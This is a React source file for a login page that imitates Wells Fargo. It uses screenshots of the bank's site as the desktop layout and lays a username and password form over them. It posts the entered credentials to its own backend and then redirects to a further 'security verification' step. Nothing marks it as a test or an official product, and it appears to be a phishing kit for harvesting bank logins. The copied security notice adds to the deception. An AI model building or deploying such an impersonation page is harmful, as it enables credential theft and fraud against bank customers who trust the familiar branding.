import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useMutation } from "@tanstack/react-query";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Checkbox } from "@/components/ui/checkbox";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormMessage,
} from "@/components/ui/form";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { Key, ArrowRight, User } from "lucide-react";
import { Link, useLocation } from "wouter";
import { OfficialFooter } from "@/components/official-footer";
import { MobileMenu } from "@/components/mobile-menu";

// Desktop images
import desktopHero from "@/assets/desktop/desktop-hero.jpg";
import desktopOffers from "@/assets/desktop/desktop-offers.jpg";
import desktopSavings from "@/assets/desktop/desktop-savings.jpg";
import desktopGuidance from "@/assets/desktop/desktop-guidance.jpg";
import desktopApp from "@/assets/desktop/desktop-app.jpg";
import desktopCommunity from "@/assets/desktop/desktop-community.jpg";
import desktopFooterTop from "@/assets/desktop/desktop-footer-top.jpg";
import desktopFooterBottom from "@/assets/desktop/desktop-footer-bottom.jpg";

const loginSchema = z.object({
  username: z.string().min(1, "Username is required"),
  password: z.string().min(1, "Password is required"),
  saveUsername: z.boolean().default(false),
});

type LoginFormData = z.infer<typeof loginSchema>;

function getGreeting() {
  const hour = new Date().getHours();
  if (hour < 12) return "Good morning";
  if (hour < 17) return "Good afternoon";
  return "Good evening";
}

export default function LoginPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [greeting] = useState(getGreeting());
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const [biometricLoading, setBiometricLoading] = useState(false);

  const handleBiometricLogin = async () => {
    setBiometricLoading(true);
    try {
      const challengeRes = await fetch("/api/auth/biometric/challenge", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "authenticate" }),
      });
      
      if (!challengeRes.ok) throw new Error("Failed to get challenge");
      
      const { challenge, rpId, allowCredentials } = await challengeRes.json();
      
      const credential = await navigator.credentials.get({
        publicKey: {
          challenge: Uint8Array.from(atob(challenge), c => c.charCodeAt(0)),
          rpId: rpId || window.location.hostname,
          allowCredentials: allowCredentials?.map((id: string) => ({
            id: Uint8Array.from(atob(id), c => c.charCodeAt(0)),
            type: "public-key" as const,
          })) || [],
          userVerification: "preferred",
          timeout: 60000,
        },
      }) as PublicKeyCredential;

      if (credential) {
        const authRes = await fetch("/api/auth/biometric/authenticate", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            credentialId: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array((credential as any).rawId)))),
            signature: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array((credential.response as any).signature)))),
            authenticatorData: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array((credential.response as any).authenticatorData)))),
            clientDataJSON: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(credential.response.clientDataJSON)))),
          }),
        });

        if (authRes.ok) {
          const authData = await authRes.json();
          toast({
            title: "Biometric Sign On Successful",
            description: "Please complete security verification...",
          });
          sessionStorage.setItem("loginUsername", authData.user?.id || "biometric_user");
          setLocation("/verify");
        } else {
          throw new Error("Biometric authentication failed");
        }
      }
    } catch (error: any) {
      toast({
        title: "Biometric Sign On Failed",
        description: error.name === "NotAllowedError" 
          ? "Biometric authentication was cancelled or not available."
          : "Please try again or use your username and password.",
        variant: "destructive",
      });
    } finally {
      setBiometricLoading(false);
    }
  };

  const form = useForm<LoginFormData>({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      username: "",
      password: "",
      saveUsername: false,
    },
  });

  const loginMutation = useMutation({
    mutationFn: async (data: LoginFormData) => {
      const response = await apiRequest("POST", "/api/auth/login", {
        username: data.username,
        password: data.password,
      });
      const result = await response.json();
      return { ...result, username: data.username };
    },
    onSuccess: (data) => {
      sessionStorage.setItem("loginUsername", data.username);
      toast({
        title: "Sign On Successful",
        description: "Please complete security verification...",
      });
      setLocation("/verify");
    },
    onError: (error: Error) => {
      toast({
        title: "Sign On Failed",
        description: error.message || "Invalid username or password",
        variant: "destructive",
      });
    },
  });

  const onSubmit = (data: LoginFormData) => {
    loginMutation.mutate(data);
  };

  const hasCredentials = form.watch("username") && form.watch("password");

  // Desktop Layout (laptop/desktop only - lg: breakpoint 1024px+)
  const DesktopLayout = () => (
    <div className="hidden lg:block min-h-screen bg-white">
      {/* Desktop shows the screenshot images */}
      <div className="w-full">
        <img 
          src={desktopHero} 
          alt="Wells Fargo Home" 
          className="w-full h-auto cursor-pointer"
          onClick={() => {
            // Allow clicking on the login area to focus the form
            const usernameInput = document.querySelector('[data-testid="desktop-input-username"]') as HTMLInputElement;
            if (usernameInput) usernameInput.focus();
          }}
        />
        
        {/* Floating login form positioned over the hero image */}
        <div className="absolute top-[140px] left-[30px] w-[280px] bg-white/95 p-4 rounded shadow-lg z-10">
          <h3 
            className="text-lg text-[#1a1a1a] mb-3"
            style={{ fontFamily: "Georgia, 'Times New Roman', serif" }}
          >
            {greeting}
          </h3>
          <p className="text-xs text-gray-600 mb-3">Sign on to manage your accounts.</p>
          
          <Form {...form}>
            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-2">
              <FormField
                control={form.control}
                name="username"
                render={({ field }) => (
                  <FormItem>
                    <FormControl>
                      <Input
                        placeholder="Username"
                        autoComplete="username"
                        className="h-10 px-3 text-sm border border-gray-300 rounded focus:border-[#d71e28] focus:ring-0"
                        data-testid="desktop-input-username"
                        {...field}
                      />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <FormField
                control={form.control}
                name="password"
                render={({ field }) => (
                  <FormItem>
                    <FormControl>
                      <div className="relative">
                        <Input
                          type={showPassword ? "text" : "password"}
                          placeholder="Password"
                          autoComplete="current-password"
                          className="h-10 px-3 pr-12 text-sm border border-gray-300 rounded focus:border-[#d71e28] focus:ring-0"
                          data-testid="desktop-input-password"
                          {...field}
                        />
                        <button
                          type="button"
                          onClick={() => setShowPassword(!showPassword)}
                          className="absolute right-2 top-1/2 -translate-y-1/2 text-[#d71e28] font-medium text-xs underline"
                        >
                          {showPassword ? "Hide" : "Show"}
                        </button>
                      </div>
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <FormField
                control={form.control}
                name="saveUsername"
                render={({ field }) => (
                  <FormItem>
                    <div className="flex items-center gap-2">
                      <FormControl>
                        <Checkbox
                          checked={field.value}
                          onCheckedChange={field.onChange}
                          className="h-4 w-4 border border-gray-400 data-[state=checked]:bg-[#d71e28] data-[state=checked]:border-[#d71e28]"
                        />
                      </FormControl>
                      <label className="text-xs text-[#1a1a1a]">Save username</label>
                    </div>
                  </FormItem>
                )}
              />

              <div className="flex items-center gap-2 pt-2">
                <Button
                  type="submit"
                  className="bg-[#d71e28] hover:bg-[#b91c23] text-white font-semibold rounded px-6 h-9 text-sm"
                  disabled={loginMutation.isPending}
                  data-testid="desktop-button-sign-on"
                >
                  {loginMutation.isPending ? "..." : "Sign On"}
                </Button>
                <Link 
                  href="/register" 
                  className="text-gray-600 text-sm hover:underline"
                >
                  Enroll
                </Link>
              </div>
            </form>
          </Form>
          
          <div className="mt-3 space-y-1">
            <Link href="/forgot-password" className="text-[#6b21a8] text-xs hover:underline block">
              Forgot username or password?
            </Link>
            <Link href="/security" className="text-[#6b21a8] text-xs hover:underline block">
              Security Center
            </Link>
            <Link href="/help" className="text-[#6b21a8] text-xs hover:underline block">
              Privacy, Cookies, and Legal
            </Link>
          </div>
        </div>
        
        {/* Rest of desktop images */}
        <img src={desktopOffers} alt="Special Offers" className="w-full h-auto" />
        <img src={desktopSavings} alt="Savings Account" className="w-full h-auto" />
        <img src={desktopGuidance} alt="Financial Guidance" className="w-full h-auto" />
        <img src={desktopApp} alt="Mobile App" className="w-full h-auto" />
        <img src={desktopCommunity} alt="Community" className="w-full h-auto" />
        <img src={desktopFooterTop} alt="Footer" className="w-full h-auto" />
        <img src={desktopFooterBottom} alt="Footer Bottom" className="w-full h-auto" />
      </div>
    </div>
  );

  // Mobile Layout (phones and tablets - below lg: breakpoint)
  const MobileLayout = () => (
    <div className="lg:hidden min-h-screen flex flex-col bg-white">
      {/* Header */}
      <header className="bg-[#d71e28] px-4 py-3 md:py-4 flex items-center justify-between">
        <div className="flex-1"></div>
        <h1 
          className="text-white text-xl md:text-2xl tracking-wide font-bold"
          style={{ fontFamily: "'Times New Roman', Georgia, serif", letterSpacing: "0.15em" }}
        >
          WELLS FARGO
        </h1>
        <div className="flex-1 flex justify-end">
          <MobileMenu />
        </div>
      </header>

      {/* Yellow accent bar */}
      <div className="h-1.5 md:h-2 bg-[#ffcd41]"></div>

      {/* Main Content - Centered container for larger screens */}
      <main className="flex-1 flex justify-center">
        <div className="w-full max-w-md px-5 py-8 md:py-12">
          {/* Greeting - Centered */}
          <h2 
            className="text-3xl md:text-4xl text-[#1a1a1a] mb-8 text-center"
            style={{ fontFamily: "Georgia, 'Times New Roman', serif" }}
            data-testid="text-greeting"
          >
            {greeting}
          </h2>

        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
            {/* Username Input */}
            <FormField
              control={form.control}
              name="username"
              render={({ field }) => (
                <FormItem>
                  <FormControl>
                    <Input
                      placeholder="Username"
                      autoComplete="username"
                      autoCapitalize="off"
                      autoCorrect="off"
                      spellCheck={false}
                      className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white placeholder:text-gray-400"
                      data-testid="input-username"
                      {...field}
                    />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />

            {/* Password Input */}
            <FormField
              control={form.control}
              name="password"
              render={({ field }) => (
                <FormItem>
                  <FormControl>
                    <div className="relative">
                      <Input
                        type={showPassword ? "text" : "password"}
                        placeholder="Password"
                        autoComplete="current-password"
                        className="h-14 px-4 pr-16 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white placeholder:text-gray-400"
                        data-testid="input-password"
                        {...field}
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-4 top-1/2 -translate-y-1/2 text-[#d71e28] font-medium underline text-sm"
                        data-testid="button-toggle-password"
                      >
                        {showPassword ? "Hide" : "Show"}
                      </button>
                    </div>
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />

            {/* Save Username */}
            <FormField
              control={form.control}
              name="saveUsername"
              render={({ field }) => (
                <FormItem>
                  <div className="flex items-start gap-3 mt-2">
                    <FormControl>
                      <Checkbox
                        checked={field.value}
                        onCheckedChange={field.onChange}
                        className="mt-0.5 h-5 w-5 border-2 border-gray-400 data-[state=checked]:bg-[#d71e28] data-[state=checked]:border-[#d71e28]"
                        data-testid="checkbox-save-username"
                      />
                    </FormControl>
                    <div>
                      <label className="text-base text-[#1a1a1a] font-medium cursor-pointer">
                        Save username
                      </label>
                      <p className="text-sm text-gray-600 mt-1 leading-snug">
                        To help keep your account secure, save your username only on devices that aren't used by other people.
                      </p>
                    </div>
                  </div>
                </FormItem>
              )}
            />

            {/* Sign On Button */}
            <div className="pt-4">
              <Button
                type="submit"
                className={`w-full h-14 font-semibold rounded-full text-lg transition-all ${
                  hasCredentials 
                    ? "bg-[#ffcd41] hover:bg-[#e6b938] text-[#1a1a1a]" 
                    : "bg-[#e5e5e5] text-gray-400 cursor-not-allowed"
                }`}
                disabled={loginMutation.isPending || !hasCredentials}
                data-testid="button-sign-on"
              >
                {loginMutation.isPending ? "Signing on..." : "Sign on"}
              </Button>
            </div>

            {/* Or divider */}
            <div className="flex items-center justify-center py-3">
              <span className="text-gray-500 text-base">or</span>
            </div>

            {/* Use a passkey button */}
            <Button
              type="button"
              variant="outline"
              className="w-full h-14 rounded-full border-2 border-[#1a1a1a] text-[#1a1a1a] font-semibold text-base hover:bg-gray-50"
              data-testid="button-passkey"
              onClick={handleBiometricLogin}
              disabled={biometricLoading}
            >
              <User className="w-5 h-5 mr-2" />
              {biometricLoading ? "Authenticating..." : "Use a passkey"}
            </Button>

            {/* Passkey info */}
            <p className="text-sm text-gray-600 text-center leading-snug mt-2">
              Don't have one? Create a passkey after signing on and skip the password next time.
            </p>
          </form>
        </Form>

        {/* Forgot link */}
        <div className="mt-8 flex items-center gap-2">
          <ArrowRight className="w-4 h-4 text-[#d71e28]" />
          <Link 
            href="/forgot-password" 
            className="text-[#6b21a8] font-medium hover:underline"
            data-testid="link-forgot"
          >
            Forgot username or password?
          </Link>
        </div>

        {/* Enroll section */}
        <div className="mt-8 pt-6 border-t border-gray-200">
          <div className="flex items-center justify-between">
            <span className="text-base text-gray-700">New to Wells Fargo?</span>
            <Link 
              href="/register" 
              className="text-[#d71e28] font-bold flex items-center gap-1 hover:underline"
              data-testid="link-register"
            >
              Enroll Now
              <ArrowRight className="w-4 h-4" />
            </Link>
          </div>
        </div>

        {/* Security Notice */}
        <div className="mt-8 pt-6 border-t border-gray-200">
          <p className="text-xs text-gray-500 leading-relaxed text-center">
            Your security is important to us. Wells Fargo uses 128-bit Secure Sockets Layer (SSL) encryption to protect your personal information. Never share your password with anyone. Wells Fargo will never ask for your password via email, phone, or text message.
          </p>
        </div>
        </div>
      </main>

      <OfficialFooter />
    </div>
  );

  return (
    <div className="relative">
      <DesktopLayout />
      <MobileLayout />
    </div>
  );
}
